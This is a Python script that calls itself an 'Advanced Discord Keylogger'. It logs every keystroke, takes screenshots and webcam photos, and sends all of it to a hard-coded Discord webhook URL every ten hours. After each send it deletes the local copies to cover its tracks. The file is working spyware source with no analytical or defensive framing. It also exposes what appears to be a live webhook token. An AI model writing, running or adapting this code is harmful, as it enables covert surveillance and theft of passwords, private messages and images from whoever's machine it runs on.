# External Libraries

from pynput import keyboard

import pyautogui

import cv2

import requests

import os

import time

import shutil



# Housekeeping

WEBHOOK_URL = "https://discord.com/api/webhooks/1438251822589415437/CuPBOFz0Y6cWHU2_ADQMToyLZ5XVhZ2_AGMJjnitSKw0rNglS-NZMbJOL2A2ctpON0mo"

save_dir = "labs_00"

os.makedirs(save_dir, exist_ok=True)

KEYLOG_FILE = os.path.join(save_dir, "lab-iog")



# Main Keystroke Logger Function

def on_press(key):

    try:

        k = key.char

    except:

        k = str(key)

    with open(KEYLOG_FILE, "a") as f:

        f.write(k)



listener = keyboard.Listener(on_press=on_press)

listener.start()



# Screenshot Function

def take_screenshot():

    filename = os.path.join(save_dir, "screenshot.png")

    pyautogui.screenshot().save(filename)

    return filename



# Webcam Capture Function

def take_camera_photo():

    filename = os.path.join(save_dir, "camera.png")

    cap = cv2.VideoCapture(0)

    ret, frame = cap.read()

    if ret:

        cv2.imwrite(filename, frame)

    cap.release()

    return filename



# Send Media and Keystrokes to Discord Webhook

def send_to_discord():

    # Read Keylogs

    keylog_data = ""

    if os.path.exists(KEYLOG_FILE):

        with open(KEYLOG_FILE, "r") as f:

            keylog_data = f.read()

        open(KEYLOG_FILE, "w").close()

    

    # Capture Media

    screenshot = take_screenshot()

    camera = take_camera_photo()

    media_files = [screenshot, camera]



    # Send Keylogs

    requests.post(WEBHOOK_URL, data={"content": f"# Keylogs:\n```{keylog_data}```"})



    # Send Images

    for f in media_files:

        with open(f, "rb") as file_obj:

            requests.post(WEBHOOK_URL, files={"file": file_obj})



    # Cleanup

    for f in os.listdir(save_dir):

        file_path = os.path.join(save_dir, f)

        try:

            if os.path.isfile(file_path):

                os.remove(file_path)

        except Exception as e:

            print(f"Error deleting file {file_path}: {e}")



print("[*] Advanced Discord Keylogger is running successfully...")



while True:

    time.sleep(36000)

    send_to_discord()